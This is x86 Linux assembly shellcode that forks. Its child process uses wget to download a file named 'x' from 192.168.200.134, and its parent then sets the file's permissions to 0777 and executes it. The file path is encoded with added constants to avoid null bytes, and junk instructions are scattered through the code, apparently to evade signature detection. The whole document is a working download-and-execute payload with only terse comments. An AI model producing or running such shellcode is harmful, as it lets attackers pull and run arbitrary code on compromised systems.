global _start

section .text

_start:

    ;fork
    xor eax,eax
    shl eax,5
    shr eax,6
    mov al,0x2
    int 0x80
    xor ebx,ebx
    cmp eax,ebx
    jz child
  
    ;wait(NULL)
    xor eax,eax
    cmp esi,edi
    mov al,0x7
    int 0x80
        
    ;chmod x
    xor ecx,ecx
    cld
    xor eax, eax
    push eax
    mov al, 0xf
    push 0x78
    mov ebx, esp
    std
    xor ecx, ecx
    cmp esi,edi
    mov cx, 0x1ff
    int 0x80
    
    ;exec x
    xor eax, eax
    push eax
    push 0x78
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80
    
child:
    ;download 192.168.200.134/x with wget
    push 0xb
    pop eax
    cdq
    push edx
    
    push 0x78 ;x avoid null byte
    push 0x2f343331 ;/431 
    cdq
    push 0x2e303032 ;.002
    std
    push 0x2e383631 ;.861
    cmp  esi,edi
    push 0x2e323931 ;.291 
    cdq
    mov ecx,esp
    push edx
    
    push 0x74 ;t
    mov  esi, 0x101221DA
    add  esi, 0x55555555
    mov  dword [esp-4],esi
    mov  esi, 0x2A251DEB
    add  esi, 0x44444444
    mov  dword [esp-8],esi
    mov  esi, 0x3F4041FC
    add  esi, 0x33333333
    mov  dword [esp-12],esi
    sub  esp,12
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80
